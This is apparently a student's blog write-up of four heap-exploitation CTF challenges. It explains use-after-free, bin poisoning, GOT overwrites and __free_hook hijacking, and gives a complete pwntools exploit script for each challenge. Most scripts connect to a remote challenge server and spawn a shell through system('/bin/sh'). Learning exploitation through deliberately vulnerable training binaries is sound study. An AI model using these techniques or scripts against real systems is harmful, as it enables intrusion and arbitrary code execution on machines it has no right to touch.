---
title: Don't Heap All of This Work On Me
date: "2020-07-27 20:20:31.582772"
description: "Introducing the exploits that I've found the hardest - Heap Exploits"
categories: ["code"]
---

## usemedontabuseme

Binary link: [Usemedontabuseme](usemedontabuseme)

---

Heap exploits have generally been hard for me to wrap my head around, and they escalate really fast, as you will see in this writeup:

Lets start with a basic heap exploit. The classic use-after-free. Because there are no checks for whether a part of the heap was freed or not before writing to it, it is rather easy to corrupt heap memory, manipulating it so that it allows for arbitrary reads and writes.

For the first one, we:
  - Malloc and then free 3 nodes.
    1. Currently the bins looks like: 2 -> 1 -> 0 -> NULL (nodes are not in order)
  2. Then we print out the address stored in free nodes 1 or 2, which points to an address on the heap
  3. Now that we have a heap address, we can forge a chunk by offseting the start of a legitimate chunk such that the name string overlaps with the function pointer.
    1. The new bins look like: 1 -> 2 -> Forged -> (garbage)
  4. Then we malloc 2 new chunks to empty the bins
  5. Finally we malloc our forged chunk.
  6. Write to this forged chunk, which ends up overwriting the function pointer of another chunk. Overwrite with the address of the `win` function and the `0x6447` parameter
  7. `cat flag`

```python
#!/usr/bin/python3

from pwn import *

global p
p = process('./usemedontabuseme')
#p = remote('plsdonthaq.me', 7000)

def menu():
    p.recvuntil("Choice: ")

def make(index,name):
    log.info("Make: {}".format(index))
    p.sendline("a")
    p.recvuntil("Clone ID:",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()

def edit(index,name):
    log.info("Edit: {}".format(index))
    p.sendline("c")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()

def kill(index):
    log.info("Kill: {}".format(index))
    p.sendline("b")
    p.recvuntil("Clone ID:")
    p.sendline(str(index))
    menu()

def view(index):
    log.info("View: {}".format(index))
    p.sendline("d")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Name: ",timeout=0.1)
    result = p.recvline()
    menu()
    return result

def hint(index):
    log.info("Hint: {}".format(index))
    p.sendline("h")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    return p.recvline()


win = p32(0x08048b7c)

# legitimate node to make more space in the bins
make(0, 'dummy')

# make the first one
make(1, 'first')

# make second one
make(2, 'second')

# free both + dummy
kill(0)
kill(1)
kill(2)

# Leak address
leak = view(2)

# leaked heap address
heapAddr = u32(leak[:4])

# write to the first one
edit(1, p32(heapAddr + 8))

# Create new node
make(3, 'third')
make(4, 'four')

# Create malicious node
make(5, p32(0x6447) + win)

# Get hint from corrupted node
hint(4)

p.interactive()
```

## ezpz1

---

FLAG{REDACTED}

---

The point to this one was finding out that the chunks are malloc from the bin list in reverse order. This along with the use-after-free exploit, lets you write to both the header/function pointer area and the string area, using the pointers to "strings" of two different chunks.

1. Malloc 2 chunks
2. Delete both chunks
3. Remove one of the chunks from the bins list by setting the pointer to the next free element to be some garbage.
4. malloc another chunk, which now contains the pointer to the header of the first chunk as the pointer to the string which we write to.
5. Overwrite the pointer to the `print_question` function with the `win` function
6. `cat flag`

```python
#!/usr/bin/python3

from pwn import *

#p = process('./ezpz1')
p = remote('plsdonthaq.me', 7001)
#gdb.attach(p)

# create question
def create():
	p.readuntil('choice,')
	p.sendline('c')

# delete question
def delete(index):
	p.readuntil('choice,')
	p.sendline('d')
	p.readuntil('id:')
	p.sendline(str(index))

# setting question
def setQuestion(index, question):
	p.readuntil('choice,')
	p.sendline('s')
	p.readuntil('id')
	p.sendline(str(index))

	p.readuntil('question')
	p.sendline(question)

def askQuestion(index):
	p.readuntil('choice,')
	p.sendline('a')
	p.readuntil('id')
	p.sendline(str(index))

# create question
create()
create()

# delete question
delete(0)
delete(1)

# set deleted question
setQuestion(0, 'yeet')

# create new question
create()	# 2

# write win address to it
win = p32(0x08048a5c)
setQuestion(2, win)

# call win
askQuestion(1)

p.interactive()
```

## ezpz2

---

FLAG{REDACTED}

---

_The title is a lie_

A big of a step up from the previous one, this time the print function is not in the heap. That means you cannot decide the function to call. So the first thing to find out it where to write to.  
Also, this time there is no win function..  
Making one of the challenges to find out what to overwrite.

1. Overwrite the pointer to the string with the address of the got (obtained from the binary)
2. Leak a libc address, and calculate offsets of necessary functions from the got.
3. You can find out the exact version of libc used by doing step 2 twice and putting the last 3 (hex) digits of the address into an online database like [libc.nullbyte.cat](https://libc.nullbyte.cat).
4. `free` is the only function that gets called with the string buffer as the first argument, and is also only used in one place (technically 2), so overwrite the address of `free` in the got with `system`
5. Use the previously calculated offsets to make sure that the program doesn't segfault early, by preserving the addresses of the rest of libc
6. Put `/bin/sh\x00` into the string and call `"free"` i.e. `system` with the buffer as the argument (which ask_question does for you)
7. `cat flag`

```python
#!/usr/bin/python3

from pwn import *

#p = process('./ezpz2')
p = remote('plsdonthaq.me', 7002)
#gdb.attach(p)

# create question
def create():
    p.readuntil('choice,')
    p.sendline('c')

# delete question
def delete(index):
    p.readuntil('choice,')
    p.sendline('d')
    p.readuntil('id:')
    p.sendline(str(index))

# setting question
def setQuestion(index, question):
    p.readuntil('choice,')
    p.sendline('s')
    p.readuntil('id')
    p.sendline(str(index))

    p.readuntil('question')
    p.sendline(question)

# ask a question
def askQuestion(index):
    p.readuntil('choice,')
    p.sendline('a')
    p.readuntil('id')
    p.sendline(str(index))
    p.readuntil("perhaps: '")


# legitimate creates
create()
create()

# to be manipulated
create()
create()

# delete
delete(2)
delete(0)
delete(1)

# read
askQuestion(1)

# cleanup
address = u32(p.readline()[:4])

# have try to malloc the got lol
got = 0x804b010
setQuestion(1, p32(address + 0x20))
setQuestion(0, p32(got))
create()
create()

# leak libc
askQuestion(5)

# Calculating offsets to keep the got intact
libc = u32(p.recvn(4))
system = libc - 0x140d0
getchar = libc + 0x1cf70
fgets = libc + 0x14ce0

# set everything using the overflow until __stack_chk_fail
# which can be corrupted since it never gets called
# Overwrite free with system
setQuestion(5, p32(libc) + p32(0) + p32(system) + p32(getchar) + p32(fgets))

# set the /bin/sh string in the buffer (which is put on the stack)
setQuestion(2, '/bin/sh\x00')

# Call *cough* system *cough* free
delete(2)

p.interactive()
```

## notezpz

---

FLAG{REDACTED}

---

_Alright, the title was not lying this time_

Challenges:

1. PIE: means I need to find where the GOT is
2. Full Relro: means I cannot malloc the got, or write to most places
3. There's no use-after-free anymore, so you can only rely on the buffer overflow of `0x78` bytes

So what do you do?

1. There's a pointer to the `print_question` function, so you can find the address of the got by leaking it (as it is at a constant offset)
2. While you cannot write to the got, you can write to hooks in libc!
3. _Let's face it, buffer overflows are better than other exploits anyway_

Here's a how to:

1. Create enough space on the heap by malloc-ing a couple of times, because overflows destroy the chunks.
2. Create 2 chunks, then free the one that you malloc-ed later.
3. Overflow the string from the first one, into the metadata of the second one. To leak an address from the metadata, you need to get rid of the null byte put at the end of the read, which can be done by overflowing only one byte into the pointer to the next free chunk, then malloc-ing that same chunk to overwrite the pointer (along with the null byte) with the pointer to the `print_question` function.
4. Leak the function pointer, and calculate offset to the GOT.
5. Leak an address in libc, by grooming a chunk with the function pointer in the metadata set to the `print_question` function, and the string pointer set to the address of the GOT.
6. If the libc is unknown, do step 5 multiple times to find out the exact version. Here we assume 2.27, same as the one found in ezpz2.
7. Calculate offsets to the `__free_hook` and `system` functions in libc. We overwrite the free hook as free is called with our buffer, which allows us to control the parameters passed to `system`.
8. (Optional) fix the heap by using the overflow. Amazing for debugging, since you broke `vis_heap_chunks` from gdb in step 3.
9. Overwrite the free hook with system, and call `free` (but actually `system` now) with `/bin/sh\x00` in the buffer.
10. `cat flag`

```python
#!/usr/bin/python3

from pwn import *

#p = process('./notezpz')
p = remote('plsdonthaq.me', 7003)
#gdb.attach(p)

# create question
def create():
    p.readuntil('choice,')
    p.sendline('c')

# delete question
def delete(index):
    p.readuntil('choice,')
    p.sendline('d')
    p.readuntil('id:')
    p.sendline(str(index))

# setting question
def setQuestion(index, question):
    p.readuntil('choice,')
    p.sendline('s')
    p.readuntil('id')
    p.sendline(str(index))

    p.readuntil('question')
    p.sendline(question)

# ask a question
def askQuestion(index):
    p.readuntil('choice,')
    p.sendline('a')
    p.readuntil('id')
    p.sendline(str(index))

    p.readuntil("perhaps: '")

# Extra space to be used later
create()
create()

# create 2, overwrite the second one
create()
create()
delete(3)   # offset by 2

# Overflow into the freed chunk
setQuestion(2, b'A' * 31)

# malloc the freed chunk again.
# This deletes the null byte at the end, creating a leak
create()

# Leak the address of the print function
askQuestion(2)
inp = p.readuntil("'", drop=True)
print_func = u32(inp[-4:])

# The got is at a constant offset from the print function
printf_got = print_func + 0x27ba

# write the got address into the function
# while keeping the print function's address constant
# Since node 3 is destroyed, we overflow into node 2
setQuestion(1, b'B'*28 + p32(0x21) + p32(print_func) + 5 * p32(0) + p32(printf_got))

# leak libc from the got
askQuestion(2)
printf_libc = u32(p.recvn(4))

# Calculate offsets
system_libc = printf_libc - 0x140d0
free_hook = printf_libc + 0x188600

# Taking full advantage of the overflow, leak the address of the free hook
# While I'm at it, I'll also fix the heap so I can use vis_heap_chunks again
setQuestion(1, b'C'*28 + p32(0x21) + p32(print_func) + 5 * p32(0) + p32(free_hook) + p32(0x21) + 7*p32(0) + p32(0x21))

# Write the address of system to the free_hook's address
setQuestion(2, p32(system_libc))

# Set buffer of unused node to /bin/sh
setQuestion(0, '/bin/sh\x00')

# Free the node, but actually call system with its buffer /bin/sh
delete(0)

p.interactive()
```

## Conclusion

---

All in all, this week was very challenging. Idk what the title is about but I don't remember any binary to be _'ezpz'_
